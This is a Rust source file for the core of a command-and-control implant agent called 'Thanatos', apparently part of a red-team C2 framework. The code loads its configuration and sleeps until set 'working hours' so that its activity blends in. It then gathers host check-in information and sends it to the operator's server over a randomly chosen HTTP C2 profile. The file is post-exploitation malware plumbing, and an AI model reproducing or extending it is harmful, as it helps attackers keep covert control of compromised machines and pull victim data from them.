use std::time::SystemTime;

use chrono::{DateTime, NaiveTime, Utc};
use errors::ThanatosError;
use rand::{rngs::SmallRng, seq::IteratorRandom, SeedableRng};

use crate::{debug, native::checkininfo::get_checkininfo};

use super::workinghours;

enum C2Profile {
    Http(http_profile::HttpC2Profile),
}

struct ConfiguredC2Profile {
    active: bool,
    profile: C2Profile,
}

pub struct Agent {
    working_hours: WorkingHours,
    profiles: Vec<ConfiguredC2Profile>,
    _retries: u32,
    rng: SmallRng,
}

pub(super) struct WorkingHours {
    pub(super) start: NaiveTime,
    pub(super) end: NaiveTime,
}

impl Agent {
    pub fn new(config: ConfigVars) -> Result<Agent, ThanatosError> {
        Ok(Agent {
            working_hours: WorkingHours {
                start: NaiveTime::from_num_seconds_from_midnight_opt(
                    config.working_hours_start(),
                    0,
                )
                .ok_or(ThanatosError::ConfigParseError)?,
                end: NaiveTime::from_num_seconds_from_midnight_opt(config.working_hours_end(), 0)
                    .ok_or(ThanatosError::ConfigParseError)?,
            },

            #[allow(unused_mut)]
            #[allow(clippy::vec_init_then_push)]
            profiles: {
                let mut profiles = Vec::new();

                #[cfg(feature = "http")]
                profiles.push(ConfiguredC2Profile {
                    active: true,
                    profile: C2Profile::Http(http_profile::HttpC2Profile::new(
                        config.uuid()?,
                        config.http().ok_or(ThanatosError::ConfigParseError)?,
                    )),
                });

                profiles
            },

            _retries: config.connection_retries(),

            rng: SmallRng::from_entropy(),
        })
    }

    pub fn run(mut self) {
        self.handle_working_hours();

        if let Err(e) = self.perform_checkin() {
            debug!("Checkin failed: {:?}", e);
        }
    }

    fn perform_checkin(&mut self) -> Result<(), ThanatosError> {
        let checkin_data = get_checkininfo();

        let selected_profile = &mut self.select_profile()?.profile;

        match selected_profile {
            C2Profile::Http(http) => {
                http.send_checkin(checkin_data);
            }
        }

        Ok(())
    }

    fn select_profile(&mut self) -> Result<&mut ConfiguredC2Profile, ThanatosError> {
        self.profiles
            .iter_mut()
            .filter(|profile| profile.active)
            .choose(&mut self.rng)
            .ok_or(ThanatosError::OutOfProfiles)
    }

    fn handle_working_hours(&self) {
        if let Some(interval) = workinghours::calculate_working_hours(
            DateTime::<Utc>::from(SystemTime::now()),
            self.working_hours.start,
            self.working_hours.end,
        ) {
            std::thread::sleep(interval);
        }
    }
}
